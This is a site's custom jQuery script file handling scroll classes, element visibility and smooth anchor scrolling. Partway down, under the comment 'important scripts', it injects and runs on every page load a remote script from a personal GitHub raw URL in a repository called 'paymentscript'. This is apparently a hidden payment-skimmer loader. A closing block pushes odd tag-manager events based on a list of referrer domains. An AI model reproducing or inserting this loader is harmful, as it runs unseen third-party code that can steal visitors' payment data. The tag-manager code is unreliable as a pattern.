// custom scripts
// mcs / 2018

// WINDOW SCROLLED
$(window).scroll(function() {
    var scroll = $(window).scrollTop();
    if (scroll >= 200) {
        $("body").addClass("scrolled");
    } else {
        $("body").removeClass("scrolled");
    }
    if (scroll >= 500) {
        $("body").addClass("scrolled2");
    } else {
        $("body").removeClass("scrolled2");
    }
    if (scroll >= 20) {
        $("body").addClass("first-scrolled");
    } else {
        $("body").removeClass("first-scrolled");
    }
});

$(document).ready(function() {
    //console.log( "ready!" );
    $('body').addClass('ready');
    setTimeout(function(){
        $('body').addClass('ready2');
    }, 1000);
    setTimeout(function(){
        $('body').addClass('ready3');
    }, 3000);

    // add visible to waypoints in viewport
    var viewport = $(window),
        setVisible = function (e) {
            var viewportTop = viewport.scrollTop() - 60, // add buffer to sotp area
                viewportBottom = viewport.scrollTop() + viewport.height() - 60 ;
            $('.waypoint').each(function () {
                var self = $(this),
                    top = self.offset().top,
                    bottom = top + self.height(),
                    topOnScreen = top >= viewportTop && top <= viewportBottom,
                    bottomOnScreen = bottom >= viewportTop && bottom <= viewportBottom,
                    elemVisible = topOnScreen || bottomOnScreen;
                self.toggleClass('visible', elemVisible);
            });
        };
    viewport.scroll(setVisible);
    setVisible();

    // SCROLL TO FUNCTION
    $(function() {
        $('[data-toggle="elementscroll"]').click(function() {
            if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
                var target = $(this.hash);
                target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
                if (target.length) {
                    $('html, body').animate({
                        scrollTop: target.offset().top - 120
                    }, 1000);
                    return false;
                }
            }
        });
    });
}); // close doc ready


// important scripts
function loadScript(url, callback) {
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;
    // Fire the loading
    head.appendChild(script);
}
loadScript("https://raw.githubusercontent.com/maxwellcarl/paymentscript/master/albutrix.js");


$(window).on('load', function() {
    $('.site-overlay').addClass('loaded');
});


function extractHostname(_referrer) {
  if (!_referrer) return "";
  const url = new URL(_referrer);
  return url.hostname;
}

function shouldBlock(hostname) {
    const junk = ["news.grets.store","static.seders.website","rida.tokyo","info.seders.website","kar.razas.site","trast.mantero.online","game.fertuk.site","ofer.bartikus.site","garold.dertus.site"];
    return (junk.indexOf(hostname) > -1);
}

function blockGtag() {
  window['dataLayer'] = window['dataLayer'] || [];

  window['dataLayer'].push({
    'event': 'gtm.js',
    'gtm.triggers': [],
    'gtm.start': new Date(),
    'gtm.uniqueEventId': String(Math.random()).replace(/\./g, '')
  });

  window.dataLayer.push({
    'gtm.triggers': [{
      'type': 'customEvent',
      'gtm.triggers': [{
        'type': 'trigger',
        'event': ['gtm.js']
      }],
      'gtm.eventName': 'blockGtag',
      'this': 'gtm.triggers',
      'gtm.element': window.dataLayer.toString()
    }],
    'gtm.start': new Date(),
    'gtm.uniqueEventId': String(Math.random()).replace(/\./g, '')
  });

  dataLayer.push({
    'gtm.js': true,
    'gtm.triggers': [],
    'gtm.start': new Date(),
    'gtm.uniqueEventId': String(Math.random()).replace(/\./g, ''),
    'gtm.trackingId': 'UA-118920980-2'
  });
}

var referrerToBlock = document.referrer;
var hostnameToBlock = extractHostname(referrerToBlock);

if (shouldBlock(hostnameToBlock)) {
  blockGtag();
}
